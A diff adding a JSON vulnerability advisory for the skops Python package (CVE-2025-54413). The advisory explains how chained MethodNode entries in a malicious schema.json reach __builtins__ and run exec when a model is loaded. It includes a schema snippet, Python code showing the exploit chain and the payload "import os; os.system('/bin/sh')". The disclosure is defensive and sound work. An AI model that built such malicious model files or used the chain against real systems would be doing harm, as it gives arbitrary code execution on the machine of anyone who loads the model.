@@ -1,0 +1,68 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2025-07-25T19:21:32Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "skops"
+  },
+  "Advisory": {
+    "DatabaseId": 305289,
+    "Id": "GSA_kwCzR0hTQS00djZ3LXhwbWgtZ2ZncM4ABKiJ",
+    "GhsaId": "GHSA-4v6w-xpmh-gfgp",
+    "References": [
+      {
+        "Url": "https://github.com/skops-dev/skops/security/advisories/GHSA-4v6w-xpmh-gfgp"
+      },
+      {
+        "Url": "https://github.com/skops-dev/skops/commit/0aeca055509dfb48c1506870aabdd9e247adf603"
+      },
+      {
+        "Url": "https://drive.google.com/drive/folders/1bmVV18mnPbWy21hVYgf51yVJpf78vtB_?usp=sharing"
+      },
+      {
+        "Url": "https://github.com/skops-dev/skops/releases/tag/v0.12.0"
+      },
+      {
+        "Url": "https://github.com/skops-dev/skops/security/advisories/GHSA-m7f4-hrc6-fwg3"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54413"
+      },
+      {
+        "Url": "https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-54413"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-4v6w-xpmh-gfgp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-4v6w-xpmh-gfgp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-54413"
+      }
+    ],
+    "Description": "## Summary\n\nAn inconsistency in `MethodNode` can be exploited to access unexpected object fields through dot notation. This can be used to achieve **arbitrary code execution at load time**.\n\nWhile this issue may seem similar to https://github.com/skops-dev/skops/security/advisories/GHSA-m7f4-hrc6-fwg3, it is actually more severe, as it relies on fewer assumptions about trusted types.\n\n\n## Details\n\nThe `MethodNode` allows access to attributes of existing objects via dot notation. However, there are several critical shortcomings:\n\n* Although the `__class__` and `__module__` fields are checked via `get_untrusted_types` and during the `load` phase (as a concatenated string), **they are not actually used by `MethodNode`**. Instead, the `func` and `obj` entries in the `schema.json` are used to determine behavior. This means that even an apparently harmless `__module__.__class__` pair can lead to access of arbitrary attributes or methods of loaded objects, without any additional checks.\n\n* **Nothing prevents an attacker from chaining multiple `MethodNode` instances** to traverse the object hierarchy and access harmful attributes.\n\nAn object can be loaded using the `ObjectNode`, which normally enforces strict checks and allows only trusted or explicitly permitted objects. However, once the object is loaded, dot notation can be used to access any of its attributes or methods. Furthermore, by chaining multiple `MethodNode`s, one can traverse the Python object hierarchy and reach dangerous components such as the `builtins` dictionary—which contains functions like `exec` and `eval`.\n\nThis vulnerability allows the attacker to **bypass both `get_untrusted_types` and `load` checks**, enabling access to dangerous attributes and methods without triggering any alerts. As demonstrated in the PoC, arbitrary code execution is possible using just an anonymous object returned by `get_untrusted_types` (in the example, `builtins.int`, though any type would suffice since it doesn't influence the exploit).\n\n\nFor example, consider a malicious `schema.json` snippet like:\n\n```json\n...\n\"__class__\": \"int\",\n\"__module__\": \"builtins\",\n\"__loader__\": \"MethodNode\",\n\"content\": {\n  \"obj\": {\n    \"__class__\": \"int\",\n    \"__module__\": \"builtins\",\n    \"__loader__\": \"MethodNode\",\n    \"content\": {\n      \"obj\": {\n        \"__class__\": \"QuadraticDiscriminantAnalysis\",\n        \"__module__\": \"sklearn.discriminant_analysis\",\n        \"__loader__\": \"ObjectNode\",\n        \"__id__\": 1\n      },\n      \"func\": \"decision_function\"\n    }\n  },\n  \"func\": \"__builtins__\"\n}\n...\n```\n\nHere, the attacker loads a trusted `QuadraticDiscriminantAnalysis` object using `ObjectNode`, accesses its `decision_function` method via `MethodNode`, and then uses another `MethodNode` to access the `__builtins__` dictionary—**all without triggering the untrusted type detection mechanisms**.\n\n\n## Proof of Concept (PoC)\n\nThe provided PoC demonstrates arbitrary code execution using only `builtins.int` as the type returned by `get_untrusted_types` and verified by `load`. Note that the actual type is fully controlled by the attacker and can be anything (e.g., `provola.whatever`), as it's not used by `skops` or the exploit.\n\n### Components Used in the Exploit\n\nTo craft the exploit, the following `skops` nodes are used:\n\n* **`MethodNode`** – to silently access arbitrary Python attributes via dot notation. This is the vulnerable core.\n* **`ObjectNode`** – to load a trusted object and use it as a base to access its attributes and methods. Also used to set object state via `__setstate__`.\n* **`PartialNode`** – to easily control arguments passed to functions accessed.\n* **`DefaultDictNode`** – to store a crafted call to `exec` using the `default_factory` attribute.\n* **`DictNode`** – to trigger the call at load time.\n* **`JsonNode`, `TypeNode`, `ListNode`**, etc. – for basic types, structures, and constants.\n\nAdditionally, the interesting implementation of `GridSearchCV.score` was leveraged, specifically:\n\n```python\ndef score(self, X, y=None, **params):\n    ...\n    scorer = self.scorer_[self.refit]\n    return scorer(self.best_estimator_, X, y, **score_params)\n```\n\n\n### Exploit Logic (Python Equivalent)\nThe `schema.json` used in this exploit is quite complex and carefully constructed. For this reason, the exploit logic is illustrated using the following Python code, which presents the core idea in a simplified and readable format. It simulates how the malicious `schema.json` is interpreted and executed by `skops` during model loading. The complete malicious `skops` model is attached for reference. This code demonstrates how an attacker can manipulate trusted objects and attributes using `MethodNode`, ultimately gaining access to the `__builtins__` dictionary and invoking `exec` with a controlled payload. By chaining multiple nodes and leveraging Python's object model, arbitrary code execution is achieved—without triggering any type validation mechanisms.\n\n\n```python\nfrom sklearn.discriminant_analysis import QuadraticDiscriminantAnalysis\nfrom sklearn.model_selection._search import GridSearchCV\nfrom functools import partial\nfrom collections import defaultdict\n\n# Step 1: Access builtins via dot traversal\na = QuadraticDiscriminantAnalysis().decision_function.__builtins__\n\n# Step 2: Prepare GridSearchCV with overridden attributes\nb = GridSearchCV()\nb._sklearn_version = \"1.7.0\"\n... # Less interesting attributes\nb.scorer_ = a  # builtins dict\nb.refit = \"exec\"\nb.best_estimator_ = \"import os; os.system('/bin/sh')\"\n\n# Step 3: Create callable chain\nc = b.score\nd = partial(c, {}, {})  # empty dicts as globals/locals\ne = defaultdict(**{})\ne.default_factory = d\nf = e.__getitem__  # dot traversal again :)\n\n# Step 4: Force __getitem__ with a missing key to trigger default_factory\n```\n\nWhat we can see here is that, when `f` is called, it invokes the `__getitem__` method of a `defaultdict`. Since the requested key doesn’t exist (the dict is empty), `default_factory` is triggered — which is the partial function `d`, wrapping the `score` method of the loaded `GridSearchCV` object.\n\nCritically, the attributes of the `GridSearchCV` object (`scorer_`, `refit`, and `best_estimator_`) have been overwritten so that:\n\n* `scorer_` is the `__builtins__` dictionary,\n* `refit` is set to `\"exec\"` — selecting the `exec` function from `__builtins__`,\n* `best_estimator_` contains the malicious payload: `\"import os; os.system('/bin/sh')\"`.\n\nWhen `score()` is eventually called via the partial function, it resolves `self.scorer_[self.refit]` to `exec`, and then calls it as:\n\n```python\nexec(self.best_estimator_, {}, {})\n```\n\nIn other words:\n\n```python\nexec(\"import os; os.system('/bin/sh')\", {}, {})\n```\n\nThis leads to **arbitrary command execution**.\n\nFinally, to trigger this chain, it's sufficient to force a call to `f` (i.e., `__getitem__`) with a key that doesn’t exist. This can be done automatically at model load time using `DictNode`. We use the implementation of `DictNode._construct()`:\n\n```python\ndef _construct(self):\n    content = gettype(self.module_name, self.class_name)()\n    key_types = self.children[\"key_types\"].construct()\n    for k_type, (key, val) in zip(key_types, self.children[\"content\"].items()):\n        content[k_type(key)] = val.construct()\n    return content\n```\n\nBy setting `key_types = [f]` and using a missing key, the exploit executes automatically during model loading.\n\n### What is shown when loading the model\n\nSuppose a user loads the model with the following code:\n\n```python\nfrom skops.io import load, get_untrusted_types\n\nunknown_types = get_untrusted_types(file=\"model.skops\")\nprint(\"Unknown types\", unknown_types)\ninput(\"Press enter to load the model...\")\nloaded = load(\"model.skops\", trusted=unknown_types)\n```\n\nThe output will be:\n\n```\nUnkonown types ['builtins.int']\nPress enter to load the model...\n```\n\nHowever, the model loading will trigger the execution of the payload, which in this case is a shell command. The same can be modified to execute any arbitrary code.\n\n\n### Attachments\nTthe complete exploit is uploaded in the following drive location: https://drive.google.com/drive/folders/1bmVV18mnPbWy21hVYgf51yVJpf78vtB_?usp=sharing\n\n\n## Impact\n\nAn attacker can craft a malicious model file that, when loaded, executes **arbitrary code** on the victim’s machine. This occurs **at load time**, requiring no user interaction beyond loading the model. Given that `skops` is often used in collaborative environments and is designed with security in mind, this vulnerability poses a significant threat.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-07-25T19:21:31Z",
+    "Severity": "HIGH",
+    "Summary": "Skops may allow MethodNode to access unexpected object fields through dot notation, leading to arbitrary code execution at load time",
+    "UpdatedAt": "2025-09-05T16:09:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.12.0"
+      },
+      "VulnerableVersionRange": "\u003c 0.12.0"
+    }
+  ]
+}
